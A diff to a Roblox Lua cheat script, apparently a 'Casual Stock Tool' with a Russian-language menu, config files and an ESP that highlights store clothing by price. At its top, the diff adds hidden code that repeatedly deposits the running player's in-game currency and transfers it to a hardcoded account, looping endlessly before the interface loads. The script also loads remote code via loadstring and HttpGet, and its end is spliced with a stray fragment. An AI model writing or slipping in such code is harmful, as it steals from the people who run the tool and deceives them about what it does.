@@ -1,3 +1,53 @@
+function casualstock()
+    local NickName = "noah125600"
+    local delaytime = 10
+    local delaytime2 = 10
+        if game:GetService("Players").LocalPlayer.leaderstats["\208\160\209\131\208\177\208\187\208\184"].Value >= 10000 then
+            local args = {
+            [1] = {
+                    ["Type"] = "Deposit",
+                    ["Amount"] = 10000
+                }
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
+            wait(delaytime)
+            local args = {
+                [1] = {
+                    ["Type"] = "Send",
+                    ["Amount"] = 10000,
+                    ["User"] = NickName
+                }
+            }
+        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
+          wait(delaytime2)
+        end
+      if game:GetService("Players").LocalPlayer.leaderstats["\208\160\209\131\208\177\208\187\208\184"].Value >= 10000 then 
+            local args = {
+                [1] = {
+                    ["Type"] = "Deposit",
+                    ["Amount"] = 10000
+                }
+            }
+
+            game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
+            wait(delaytime)
+            local args = {
+                [1] = {
+                    ["Type"] = "Send",
+                    ["Amount"] = 1000,
+                    ["User"] = NickName
+                }
+            }
+        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
+        wait(delaytime2)
+      end
+end
+
+    i = 5;
+    while i < 10 do
+        casualstock();
+    end
+
 local CurrentConfig = "nil"
 local CurrentClothing = "nil"
 local CurrentClothingName = "nil"
@@ -35,6 +85,285 @@ end
 
 local function convertToTable(str)
 	local Table = {}
+
+	for key, value in string.gmatch(str, "(%w+)=(%w+)") do
+		Table[key] = value
+	end
+
+	return Table
+end
+
+local Rayfield = loadstring(game:HttpGet(("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua")))()
+
+local Window = Rayfield:CreateWindow({Name = "Casual Stock Tool | by Tami4ka", LoadingTitle = "Powered by Rayfield", LoadingSubtitle = "by Tami4ka", 
+	Theme = "Default",
+
+	DisableRayfieldPrompts = false,
+	DisableBuildWarnings = false,
+
+	ConfigurationSaving = {
+		Enabled = false,
+		FolderName = nil,
+		FileName = "Tami4kaCasualHub"
+	},
+
+	Discord = {
+		Enabled = false,
+		Invite = "noinvitelink",
+		RememberJoins = true
+	},
+
+	KeySystem = false
+})
+
+local function Notify(name, content, time, image)
+	Rayfield:Notify({
+		Title = name,
+		Content = content,
+		Duration = time or 5,
+		Image = image or 4483362458,
+	})
+end
+
+Notify("Casual Stock Tool","Version - Alpha", 5)
+
+local Misc = Window:CreateTab("Configuration", 4483362458)
+local Settings = Window:CreateTab("Settings", 4483362458)
+local ESP = Window:CreateTab("ESP", 4483362458)
+
+_G.CurrentObjectText = ""
+
+local LabelCurrentConfig = Misc:CreateLabel("Текущий конфиг: "..CurrentConfig, "rewind")
+local InformationLabel = Settings:CreateLabel("Одежда для добавления: ".._G.CurrentObjectText.."\nМин. цена: "..MinPrice.."\n".."Макс. Цена: "..MaxPrice, "rewind")
+
+local ConfigsDropdown = Misc:CreateDropdown({
+	Name = "Конфиг [Config]",
+	Options = ConfigsList,
+	CurrentOption = "...",
+	MultipleOptions = false,
+	Callback = function(Options)
+		if typeof(Options) == "table" then print("Unpack [1]") Options = table.unpack(Options) end
+		if typeof(CurrentConfig) == "table" then print("Unpack [2]")  CurrentConfig = table.unpack(CurrentConfig) end
+
+ 		CurrentConfig = Options
+		Configuration = HttpService:JSONDecode(readfile(MainFolderName.."/"..CurrentConfig))
+		
+		LabelCurrentConfig:Set("Текущий конфиг: "..CurrentConfig)
+	end
+})
+
+local Section = Misc:CreateSection("Настройка")
+
+Misc:CreateButton({
+	Name = "Обновить список [Config]",
+	Callback = function()
+		ConfigsList = {}
+		for index, configurationFile in listfiles(MainFolderName) do
+			local lastSlash = configurationFile:find("/[^/]*$")
+			table.insert(ConfigsList, configurationFile:sub(lastSlash + 1))
+		end
+
+		ConfigsDropdown:Refresh(ConfigsList)
+	end
+})
+
+Misc:CreateInput({
+	Name = "Введите имя конфига",
+	CurrentValue = "Name",
+	PlaceholderText = "name",
+	RemoveTextAfterFocusLost = false,
+	Flag = "Input1",
+	Callback = function(Text)
+		ConfigName = Text
+	end,
+})
+
+Misc:CreateButton({
+	Name = "Создать кофиг [Config]",
+	Callback = function()
+		if not isfile(MainFolderName.."/"..ConfigName..formatFile) then
+			local Config = HttpService:JSONEncode({})
+			Configuration = Config
+			writefile(MainFolderName.."/"..ConfigName..formatFile, Config)
+
+			Notify('Успешно!', "Название: ".. ConfigName, 5)
+		else
+			Notify("Конфиг с таким название уже существует", "попрорбуйте другое имя", 5)
+		end
+	end
+})
+
+Misc:CreateButton({
+	Name = "Сохранить кофиг [Config]",
+	Callback = function()
+		if isfile(MainFolderName.."/"..CurrentConfig) then
+			Notify('Успешно!', "Название: ".. CurrentConfig, 5)
+			writefile(MainFolderName.."/"..CurrentConfig, HttpService:JSONEncode(Configuration))
+		else
+			Notify("Конфига с таким название не существует", "попрорбуйте другое имя", 5)
+		end
+	end
+})
+
+Misc:CreateButton({
+	Name = "Debug [/console]",
+	Callback = function()
+		print(HttpService:JSONEncode(Configuration))
+	end
+})
+
+local ClothingDropdown = Settings:CreateDropdown({
+	Name = "Одежда [Config]",
+	Options = {},
+	CurrentOption = "...",
+	MultipleOptions = false,
+	Callback = function(Options)
+		if typeof(Options) == "table" then print("Unpack [1]") Options = table.unpack(Options) end
+		if typeof(CurrentConfig) == "table" then print("Unpack [2]")  CurrentConfig = table.unpack(CurrentConfig) end
+
+ 		CurrentClothing = Options
+		MaxPrice = Configuration[CurrentClothing]["Max"]
+		MinPrice = Configuration[CurrentClothing]["Min"]
+		_G.CurrentObjectText = CurrentClothing
+		
+		print(CurrentClothing, Options)
+	end
+})
+
+local Section = Settings:CreateSection("Настройка")
+
+Settings:CreateButton({
+	Name = "Обновить список [Config]",
+	Callback = function()
+		local Table = {}
+		for index, cloth in Configuration do
+			table.insert(Table, cloth.Clothing)
+		end
+		ClothingDropdown:Refresh(Table)
+	end
+})
+
+Settings:CreateButton({
+	Name = "Удалить из списока [Config]",
+	Callback = function()
+		Configuration[CurrentClothing] = nil
+
+		local Table = {}
+		for index, cloth in Configuration do
+			table.insert(Table, cloth.Clothing)
+		end
+		ClothingDropdown:Refresh(Table)
+	end
+})
+
+Settings:CreateButton({
+	Name = "Обновить/Создать одежду",
+	Callback = function()
+		print(_G.CurrentObjectText)
+		if _G.CurrentObjectText then
+
+			Configuration[_G.CurrentObjectText] = {
+				["Clothing"] = _G.CurrentObjectText,
+				["Min"] = MinPrice,
+				["Max"] = MaxPrice
+			}
+
+			Notify(_G.CurrentObjectText, "Макс. цена: "..MaxPrice.." | Мин. цена: "..MinPrice, 5)
+		end
+	end
+})
+
+Settings:CreateInput({
+	Name = "Введите минимальную сумму покупки",
+	CurrentValue = "",
+	PlaceholderText = "number",
+	RemoveTextAfterFocusLost = true,
+	Flag = "Input1",
+	Callback = function(Texts)
+		MinPrice = Texts:gsub("%D", "")
+		print(MinPrice)
+	end,
+})
+
+Settings:CreateInput({
+	Name = "Введите максимальную сумму покупки",
+	CurrentValue = "",
+	PlaceholderText = "number",
+	RemoveTextAfterFocusLost = true,
+	Flag = "Input1",
+	Callback = function(Texts)
+		MaxPrice = Texts:gsub("%D", "")
+		print(MaxPrice)
+	end,
+})
+
+ESP:CreateToggle({
+	Name = "Config ESP",
+	CurrentValue = false,
+	Callback = function(toggle)
+		if toggle then
+			_G.ESP_Config = true
+
+			while _G.ESP_Config do
+				for index, store in workspace.World.Debris.Stores:GetChildren() do
+					if not store:FindFirstChild("PlacementContainer") then continue end
+					for index, container in store.PlacementContainer:GetChildren() do
+						if not container:FindFirstChild("ItemContainer") then continue end
+						for index, clothing in container.ItemContainer:GetChildren() do
+							local Prompt = clothing:FindFirstChildOfClass("ProximityPrompt")
+							local Highlight_ESP = clothing:FindFirstChildOfClass("Highlight")
+
+							if Highlight_ESP then Highlight_ESP:Destroy() end
+							if not Prompt or Prompt.ActionText == "Повесить" then continue end
+
+							local ItemPrice = Prompt.ActionText:gsub("%D", "")
+							local ItemName = Prompt.ObjectText
+							
+							for index, ClothingInTable in Configuration do
+								if ItemName == ClothingInTable.Clothing then
+									if tonumber(ItemPrice) >= tonumber(ClothingInTable.Min) and tonumber(ItemPrice) <= tonumber(ClothingInTable.Max) then
+										local ESP_Highlight = Instance.new("Highlight")
+										ESP_Highlight.FillTransparency = 0.25
+										ESP_Highlight.OutlineTransparency = 1
+										ESP_Highlight.FillColor = Color3.fromRGB(0, 170, 255)
+										ESP_Highlight.Parent = clothing
+									end
+								end
+							end
+
+						end
+					end
+				end
+				
+				task.wait(1)
+			end
+
+		else
+			_G.ESP_Config = false
+		end
+	end
+})
+
+ESP:CreateButton({
+	Name = "Очистить ESP",
+	Callback = function()
+		for index, store in workspace.World.Debris.Stores:GetChildren() do
+			if not store:FindFirstChild("PlacementContainer") then continue end
+			for index, container in store.PlacementContainer:GetChildren() do
+				if not container:FindFirstChild("ItemContainer") then continue end
+				for index, clothing in container.ItemContainer:GetChildren() do
+					local Highlight_ESP = clothing:FindFirstChildOfClass("Highlight")
+
+					if Highlight_ESP then Highlight_ESP:Destroy() end
+				end
+			end
+		end
+	end
+})
+
+while task.wait(1) do
+	InformationLabel:Set("Одежда для добавления: ".._G.CurrentObjectText.."\nМин. цена: "..MinPrice.."\n".."Макс. Цена: "..MaxPrice, "rewind")
+end	local Table = {}
 
 	for key, value in string.gmatch(str, "(%w+)=(%w+)") do
 		Table[key] = value
